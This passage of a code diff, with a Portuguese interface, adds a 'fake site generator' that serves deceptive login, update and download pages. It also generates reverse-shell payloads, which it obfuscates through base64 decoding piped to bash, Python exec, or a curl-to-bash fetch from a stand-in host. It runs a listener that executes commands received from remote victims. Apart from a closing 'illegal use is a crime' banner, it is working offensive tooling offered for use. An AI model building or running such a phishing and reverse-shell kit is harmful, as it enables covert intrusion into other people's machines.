+                                    output = result.stdout + result.stderr
+                                    conn.sendall(output.encode())
+                                except Exception as e:
+                                    conn.sendall(f"Erro executando comando: {e}".encode())
+                        except:
+                            break
+        except Exception as e:
+            console.print(f"[red]❌ Erro no listener: {e}[/red]")
+
+class FakeSiteGenerator:
+    def __init__(self):
+        self.server = None
+        self.server_thread = None
+        self.shell_manager = ReverseShellManager()
+        self.payloads = {}
+        
+    def start_server(self, port: int, payload: str = ""):
+        """Inicia o servidor HTTP fake"""
+        try:
+            self.payloads['payload'] = payload
+            
+            # Criar handler personalizado com payloads
+            def handler(*args):
+                FakeSiteHandler(*args, payloads=self.payloads)
+            
+            self.server = HTTPServer(('0.0.0.0', port), handler)
+            console.print(f"[green]🌐 Servidor iniciado em http://0.0.0.0:{port}[/green]")
+            
+            # Iniciar em thread separada
+            self.server_thread = threading.Thread(target=self.server.serve_forever)
+            self.server_thread.daemon = True
+            self.server_thread.start()
+            
+            return True
+        except Exception as e:
+            console.print(f"[red]❌ Erro ao iniciar servidor: {e}[/red]")
+            return False
+    
+    def stop_server(self):
+        """Para o servidor HTTP"""
+        if self.server:
+            self.server.shutdown()
+            console.print("[yellow]⏹️ Servidor parado[/yellow]")
+    
+    def generate_shell_payload(self, shell_type: str, ip: str, port: int) -> str:
+        """Gera payload de shell reverso"""
+        if shell_type in self.shell_manager.shell_types:
+            return self.shell_manager.shell_types[shell_type](ip, port)
+        return ""
+    
+    def obfuscate_payload(self, payload: str, technique: str) -> str:
+        """Ofusca o payload usando diferentes técnicas"""
+        if technique == "base64":
+            encoded = base64.b64encode(payload.encode()).decode()
+            return f"echo '{encoded}' | base64 -d | bash"
+        elif technique == "python_exec":
+            encoded = base64.b64encode(payload.encode()).decode()
+            return f"python3 -c \"exec(__import__('base64').b64decode('{encoded}').decode())\""
+        elif technique == "curl_pipe":
+            # Esta é uma simulação - na prática precisaria hospedar o payload
+            return f"curl -s http://example.com/payload.sh | bash -s -- {hashlib.md5(payload.encode()).hexdigest()[:8]}"
+        return payload
+
+class FakeSitePanel:
+    def __init__(self):
+        self.generator = FakeSiteGenerator()
+        self.banner = """
+[bold red]
+    ╔═╗┌─┐┌─┐┬ ┬  ╔═╗┬┌┬┐┌─┐  ╔═╗┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
+    ╠═╝├─┤│  ├─┤  ║ ║│ │ │ │  ║  ├─┤├┤ │  ├┴┐├┤ ├┬┘
+    ╩  ┴ ┴└─┘┴ ┴  ╚═╝┴ ┴ └─┘  ╚═╝┴ ┴└─┘└─┘┴ ┴└─┘┴└─
+[/bold red]
+[bold white on red]        GERADOR DE SITES FAKE - SHELL REVERSO v2.0[/bold white on red]
+"""
+        self.server_status = "Parado"
+        self.listener_status = "Parado"
+    
+    def show_menu(self):
+        """Mostra o menu principal"""
+        while True:
+            console.clear()
+            console.print(self.banner)
+            
+            # Status do servidor
+            status_panel = Panel.fit(
+                f"[cyan]🌐 Servidor:[/cyan] {self.server_status}\n"
+                f"[cyan]👂 Listener:[/cyan] {self.listener_status}",
+                title="[bold]Status[/bold]",
+                border_style="blue"
+            )
+            console.print(status_panel)
+            
+            table = Table(
+                title="[bold cyan]🎭 MENU PRINCIPAL[/bold cyan]",
+                show_header=True,
+                header_style="bold magenta"
+            )
+            table.add_column("Opção", style="cyan", width=10)
+            table.add_column("Descrição", style="green")
+            table.add_column("Status", style="yellow")
+            
+            table.add_row("1", "Iniciar Servidor Fake", "🌐")
+            table.add_row("2", "Gerar Payload Shell", "🐚")
+            table.add_row("3", "Iniciar Listener", "👂")
+            table.add_row("4", "Templates de Site", "📋")
+            table.add_row("5", "Técnicas de Ofuscação", "🔒")
+            table.add_row("6", "Parar Servidor", "⏹️")
+            table.add_row("0", "Sair", "🚪")
+            
+            console.print(table)
+            
+            choice = Prompt.ask(
+                "[blink yellow]➤[/blink yellow] Selecione uma opção",
+                choices=["0", "1", "2", "3", "4", "5", "6"],
+                show_choices=False
+            )
+            
+            if choice == "1":
+                self.start_fake_server()
+            elif choice == "2":
+                self.generate_shell_payload()
+            elif choice == "3":
+                self.start_listener()
+            elif choice == "4":
+                self.show_templates()
+            elif choice == "5":
+                self.show_obfuscation_techniques()
+            elif choice == "6":
+                self.stop_server()
+            elif choice == "0":
+                self.exit_program()
+    
+    def start_fake_server(self):
+        """Inicia o servidor fake"""
+        console.print(Panel.fit(
+            "[bold]🌐 CONFIGURAÇÃO DO SERVIDOR FAKE[/bold]",
+            border_style="blue"
+        ))
+        
+        port = IntPrompt.ask(
+            "[yellow]?[/yellow] Porta do servidor",
+            default=8080
+        )
+        
+        # Verificar se porta está disponível
+        try:
+            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            test_socket.bind(('0.0.0.0', port))
+            test_socket.close()
         except:
-            return "Não disponível"
+            console.print("[red]❌ Porta já em uso![/red]")
+            input("\nPressione Enter para voltar...")
+            return
+        
+        # Perguntar se quer usar um payload
+        payload = ""
+        if Confirm.ask("[yellow]?[/yellow] Incluir payload de shell reverso?"):
+            shell_type = Prompt.ask(
+                "[yellow]?[/yellow] Tipo de shell",
+                choices=list(self.generator.shell_manager.shell_types.keys()),
+                default="python"
+            )
+            
+            ip = Prompt.ask(
+                "[yellow]?[/yellow] IP para conexão reversa",
+                default=socket.gethostbyname(socket.gethostname())
+            )
+            
+            port_shell = IntPrompt.ask(
+                "[yellow]?[/yellow] Porta para conexão",
+                default=4444
+            )
+            
+            payload = self.generator.generate_shell_payload(shell_type, ip, port_shell)
+            
+            # Ofuscar payload
+            if Confirm.ask("[yellow]?[/yellow] Ofuscar payload?"):
+                technique = Prompt.ask(
+                    "[yellow]?[/yellow] Técnica de ofuscação",
+                    choices=["base64", "python_exec", "curl_pipe"],
+                    default="base64"
+                )
+                payload = self.generator.obfuscate_payload(payload, technique)
+            
+            console.print(Panel.fit(
+                f"[bold]📋 PAYLOAD GERADO:[/bold]\n\n[cyan]{payload}[/cyan]",
+                title="[green]PAYLOAD[/green]",
+                border_style="green"
+            ))
+        
+        if self.generator.start_server(port, payload):
+            self.server_status = f"Rodando em http://0.0.0.0:{port}"
+            console.print(Panel.fit(
+                f"[green]✅ Servidor iniciado com sucesso![/green]\n"
+                f"[cyan]URL: http://0.0.0.0:{port}[/cyan]\n"
+                f"[cyan]Login: http://0.0.0.0:{port}/login[/cyan]\n"
+                f"[cyan]Update: http://0.0.0.0:{port}/update[/cyan]\n"
+                f"[cyan]Download: http://0.0.0.0:{port}/download[/cyan]",
+                title="[green]SUCESSO[/green]",
+                border_style="green"
+            ))
+        
+        input("\nPressione Enter para voltar...")
+    
+    def generate_shell_payload(self):
+        """Gera payload de shell reverso"""
+        console.print(Panel.fit(
+            "[bold]🐚 GERADOR DE PAYLOAD SHELL[/bold]",
+            border_style="blue"
+        ))
+        
+        shell_type = Prompt.ask(
+            "[yellow]?[/yellow] Tipo de shell",
+            choices=list(self.generator.shell_manager.shell_types.keys()),
+            default="python"
+        )
+        
+        ip = Prompt.ask(
+            "[yellow]?[/yellow] IP para conexão reversa",
+            default=socket.gethostbyname(socket.gethostname())
+        )
+        
+        port = IntPrompt.ask(
+            "[yellow]?[/yellow] Porta para conexão",
+            default=4444
+        )
+        
+        # Gerar payload
+        payload = self.generator.generate_shell_payload(shell_type, ip, port)
+        
+        # Ofuscar payload
+        if Confirm.ask("[yellow]?[/yellow] Ofuscar payload?"):
+            technique = Prompt.ask(
+                "[yellow]?[/yellow] Técnica de ofuscação",
+                choices=["base64", "python_exec", "curl_pipe"],
+                default="base64"
+            )
+            payload = self.generator.obfuscate_payload(payload, technique)
+        
+        console.print(Panel.fit(
+            f"[bold]📋 PAYLOAD GERADO:[/bold]\n\n[cyan]{payload}[/cyan]",
+            title="[green]PAYLOAD[/green]",
+            border_style="green"
+        ))
+        
+        if Confirm.ask("[yellow]?[/yellow] Salvar em arquivo?"):
+            filename = Prompt.ask(
+                "[yellow]?[/yellow] Nome do arquivo",
+                default="payload.sh"
+            )
+            try:
+                with open(filename, 'w') as f:
+                    f.write(payload)
+                console.print(f"[green]✅ Salvo como {filename}[/green]")
+            except Exception as e:
+                console.print(f"[red]❌ Erro ao salvar: {e}[/red]")
+        
+        input("\nPressione Enter para voltar...")
+    
+    def start_listener(self):
+        """Inicia listener para shell reverso"""
+        console.print(Panel.fit(
+            "[bold]👂 CONFIGURAÇÃO DO LISTENER[/bold]",
+            border_style="blue"
+        ))
+        
+        port = IntPrompt.ask(
+            "[yellow]?[/yellow] Porta para escutar",
+            default=4444
+        )
+        
+        # Verificar se porta está disponível
+        try:
+            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            test_socket.bind(('0.0.0.0', port))
+            test_socket.close()
+        except:
+            console.print("[red]❌ Porta já em uso![/red]")
+            input("\nPressione Enter para voltar...")
+            return
+        
+        console.print(f"[yellow]⚠️ Iniciando listener na porta {port}...[/yellow]")
+        console.print("[yellow]⚠️ Pressione Ctrl+C para parar[/yellow]")
+        
+        self.listener_status = f"Ouvindo na porta {port}"
+        
+        try:
+            # Iniciar listener em thread separada
+            listener_thread = threading.Thread(
+                target=self.generator.shell_manager.start_listener,
+                args=(port,)
+            )
+            listener_thread.daemon = True
+            listener_thread.start()
+            
+            # Manter thread principal ativa
+            while listener_thread.is_alive():
+                time.sleep(1)
+                
+        except KeyboardInterrupt:
+            console.print("\n[yellow]⏹️ Listener interrompido[/yellow]")
+        except Exception as e:
+            console.print(f"[red]❌ Erro no listener: {e}[/red]")
+        
+        self.listener_status = "Parado"
+        input("\nPressione Enter para voltar...")
+    
+    def show_templates(self):
+        """Mostra templates de site disponíveis"""
+        console.print(Panel.fit(
+            "[bold]📋 TEMPLATES DE SITE DISPONÍVEIS[/bold]",
+            border_style="blue"
+        ))
+        
+        table = Table(show_header=True, header_style="bold magenta")
+        table.add_column("Template", style="cyan")
+        table.add_column("Descrição", style="green")
+        table.add_column("URL", style="yellow")
+        
+        table.add_row("Login", "Página de login fake", "/")
+        table.add_row("Update", "Página de atualização", "/update")
+        table.add_row("Dashboard", "Painel administrativo", "/dashboard")
+        table.add_row("Download", "Página de download", "/download")
+        table.add_row("Install", "Página de instalação", "/install")
+        table.add_row("Payload", "Execução de payload", "/payload")
+        table.add_row("Shell", "Terminal web", "/shell")
+        
+        console.print(table)
+        input("\nPressione Enter para voltar...")
+    
+    def show_obfuscation_techniques(self):
+        """Mostra técnicas de ofuscação"""
+        console.print(Panel.fit(
+            "[bold]🔒 TÉCNICAS DE OFUSCAÇÃO[/bold]",
+            border_style="blue"
+        ))
+        
+        table = Table(show_header=True, header_style="bold magenta")
+        table.add_column("Técnica", style="cyan")
+        table.add_column("Descrição", style="green")
+        table.add_column("Exemplo", style="yellow")
+        
+        table.add_row("base64", "Codifica payload em base64", "echo 'payload' | base64 -d | bash")
+        table.add_row("python_exec", "Executa via Python", "python3 -c \"exec('base64_payload')\"")
+        table.add_row("curl_pipe", "Download e execução remota", "curl http://ex.com/payload | bash")
+        
+        console.print(table)
+        input("\nPressione Enter para voltar...")
+    
+    def stop_server(self):
+        """Para o servidor"""
+        self.generator.stop_server()
+        self.server_status = "Parado"
+        console.print("[green]✅ Servidor parado com sucesso[/green]")
+        time.sleep(1)
+    
+    def exit_program(self):
+        """Sai do programa"""
+        console.print(Panel.fit(
+            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
+            border_style="red"
+        ))
+        self.generator.stop_server()
+        console.print("[cyan]Saindo...[/cyan]")
+        time.sleep(1)
+        sys.exit(0)
 
 def main():
-    print(f"""{Colors.PURPLE}
-    ██████╗ █████╗ ██╗   ██╗███████╗███████╗███████╗        ██████╗ ██╗  ██╗███████╗██╗     ██╗     
-    ██╔════╝██╔══██╗██║   ██║██╔════╝██╔════╝██╔════╝        ██╔══██╗██║  ██║██╔════╝██║     ██║     
-    ██║     ███████║██║   ██║█████╗  █████╗  █████╗          ██████╔╝███████║█████╗  ██║     ██║     
-    ██║     ██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══╝  ██╔══╝          ██╔═══╝ ██╔══██║██╔══╝  ██║     ██║     
-    ╚██████╗██║  ██║ ╚████╔╝ ███████╗██║     ███████╗        ██║     ██║  ██║███████╗███████╗███████╗
-    ╚═════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝     ╚══════╝        ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
-    {Colors.RESET}""")
-    
-    print(f"{Colors.CYAN}    Gerador de Página de Download com Shell Reverso{Colors.RESET}")
-    print(f"{Colors.CYAN}    ⚠️  APENAS PARA TESTES DE SEGURANÇA AUTORIZADOS ⚠️{Colors.RESET}\n")
-    
-    # Mostrar informações
-    server = DownloadServer()
-    local_ip = server.get_local_ip()
-    public_ip = server.get_public_ip()
-    
-    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Local: {local_ip}")
-    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Público: {public_ip}")
-    print(f"{Colors.BLUE}[*] {Colors.RESET}Porta HTTP: {PORT}")
-    print(f"{Colors.BLUE}[*] {Colors.RESET}Porta Shell: 4444")
-    print(f"{Colors.BLUE}[*] {Colors.RESET}Arquivo: {DOWNLOAD_FILE}\n")
-    
-    # Iniciar servidor
-    server.start_server()
+    try:
+        panel = FakeSitePanel()
+        panel.show_menu()
+    except KeyboardInterrupt:
+        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
+        sys.exit(0)
+    except Exception as e:
+        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
+        sys.exit(1)
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
